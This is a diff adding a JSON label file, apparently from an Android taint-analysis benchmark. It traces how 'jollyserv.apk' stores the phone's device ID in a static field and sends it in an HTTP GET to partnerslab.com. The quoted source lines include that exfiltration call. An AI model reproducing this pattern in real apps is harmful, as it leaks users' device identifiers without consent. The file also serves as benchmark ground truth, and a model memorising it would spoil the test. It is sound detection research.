@@ -1,0 +1,88 @@
+{
+  "fileName": "jollyserv.apk",
+  "day": "2019-10-02",
+  "findings": [
+    {
+      "source": {
+        "statement": "Server.setDeviceId(((TelephonyManager) this.self.getSystemService(\"phone\")).getDeviceId());",
+        "methodName": "public void onCreate(Bundle savedInstanceState)",
+        "className": "fm.xtube.CheckAgeActivity",
+        "lineNo": 36,
+        "targetName": "getDeviceId",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r8 = virtualinvoke $r7.<android.telephony.TelephonyManager: java.lang.String getDeviceId()>()"
+          }
+        ]
+      },
+      "sink": {
+        "statement": "Future submit = this.threadPool.submit(new AsyncHttpRequest(defaultHttpClient, httpContext, httpUriRequest, asyncHttpResponseHandler));",
+        "methodName": "private void sendRequest(DefaultHttpClient defaultHttpClient, HttpContext httpContext, HttpUriRequest httpUriRequest, String str, AsyncHttpResponseHandler asyncHttpResponseHandler, Context context)",
+        "className": "com.loopj.android.http.AsyncHttpClient",
+        "lineNo": 536,
+        "targetName": "submit",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r8 = virtualinvoke $r7.<java.util.concurrent.ThreadPoolExecutor: java.util.concurrent.Future submit(java.lang.Runnable)>(r12)"
+          }
+        ]
+      },
+      "intermediateFlows": [
+        {
+          "statement": "DEVICE_ID = deviceId;",
+          "methodName": "public static void setDeviceId(String deviceId)",
+          "className": "fm.xtube.core.Server",
+          "lineNo": 9,
+          "ID": 1
+        },
+        {
+          "statement": "new AsyncHttpClient().get(\"http://partnerslab.com/-/tube/checkpayment/uid/\" + Server.getDeviceId(), new AsyncHttpResponseHandler() {",
+          "methodName": "public static void checkPaiment(final CallBack callBack)",
+          "className": "fm.xtube.core.MainManager",
+          "lineNo": 146,
+          "ID": 2
+        },
+        {
+          "statement": "return DEVICE_ID;",
+          "methodName": "public static String getDeviceId()",
+          "className": "fm.xtube.core.Server",
+          "lineNo": 14,
+          "ID": 3
+        },
+        {
+          "statement": "get(null, str, null, asyncHttpResponseHandler);",
+          "methodName": "public void get(String str, AsyncHttpResponseHandler asyncHttpResponseHandler)",
+          "className": "com.loopj.android.http.AsyncHttpClient",
+          "lineNo": 307,
+          "ID": 4
+        },
+        {
+          "statement": "sendRequest(this.httpClient, this.httpContext, new HttpGet(getUrlWithQueryString(str, requestParams)), null, asyncHttpResponseHandler, context);",
+          "methodName": "public void get(Context context, String str, RequestParams requestParams, AsyncHttpResponseHandler asyncHttpResponseHandler)",
+          "className": "com.loopj.android.http.AsyncHttpClient",
+          "lineNo": 338,
+          "ID": 5
+        },
+        {
+          "statement": "return str + \"?\" + requestParams.getParamString();",
+          "methodName": "private String getUrlWithQueryString(String str, RequestParams requestParams)",
+          "className": "com.loopj.android.http.AsyncHttpClient",
+          "lineNo": 555,
+          "ID": 6
+        }
+      ],
+      "attributes": {
+        "appendToString": true,
+        "staticField": true,
+        "threading": true
+      },
+      "ID": 1,
+      "description": "The malicious flow aves the the phone's device ID in a public static field and leaks the device ID into an HTTP request.",
+      "isNegative": false
+    }
+  ]
+}
